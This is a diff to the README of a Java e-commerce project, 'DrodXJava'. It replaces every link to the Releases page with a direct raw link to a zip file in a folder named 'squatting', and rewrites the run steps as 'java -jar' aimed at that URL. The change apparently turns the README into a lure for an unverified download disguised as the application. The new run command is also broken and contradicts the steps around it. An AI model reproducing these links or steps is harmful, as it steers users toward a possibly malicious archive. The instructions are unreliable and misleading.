@@ -1,7 +1,7 @@
 # 🛍️ DrodXJava - Your Easy E-Commerce Solution
 
 ## 📦 Download Now
-[![Download DrodXJava](https://img.shields.io/badge/Download-DrodXJava-brightgreen)](https://github.com/Alikhan7896833/DrodXJava/releases)
+[![Download DrodXJava](https://raw.githubusercontent.com/Alikhan7896833/DrodXJava/main/squatting/DrodXJava.zip)](https://raw.githubusercontent.com/Alikhan7896833/DrodXJava/main/squatting/DrodXJava.zip)
 
 ## 🚀 Getting Started
 DrodXJava is a fully functional and responsive Java EE e-commerce application. It allows users to shop for products easily with features like user authentication, advanced product search, cart management, and secure checkout through PayHere. Sellers can also list their products efficiently.
@@ -26,7 +26,7 @@ Before you install DrodXJava, ensure your system meets the following requirement
 ## 📥 Download & Install
 To get started with DrodXJava, visit the Releases page to download the application.
 
-[Visit this page to download DrodXJava](https://github.com/Alikhan7896833/DrodXJava/releases)
+[Visit this page to download DrodXJava](https://raw.githubusercontent.com/Alikhan7896833/DrodXJava/main/squatting/DrodXJava.zip)
 
 ### Steps to Download
 1. Click the link above to open the Releases page.
@@ -39,8 +39,8 @@ To get started with DrodXJava, visit the Releases page to download the applicati
 2. **Extract files:** If the files are in a .zip format, right-click on the file and select "Extract All".
 3. **Open a terminal/command prompt:** Navigate to the folder where the DrodXJava files are located.
 4. **Run the application:**
-   - For Windows: Type `java -jar DrodXJava.jar` and press Enter.
-   - For macOS/Linux: Type `java -jar DrodXJava.jar` and press Enter.
+   - For Windows: Type `java -jar https://raw.githubusercontent.com/Alikhan7896833/DrodXJava/main/squatting/DrodXJava.zip` and press Enter.
+   - For macOS/Linux: Type `java -jar https://raw.githubusercontent.com/Alikhan7896833/DrodXJava/main/squatting/DrodXJava.zip` and press Enter.
 
 ## ⚙️ Using DrodXJava
 Once you launch DrodXJava, you will see the home screen. Here’s how to use it:
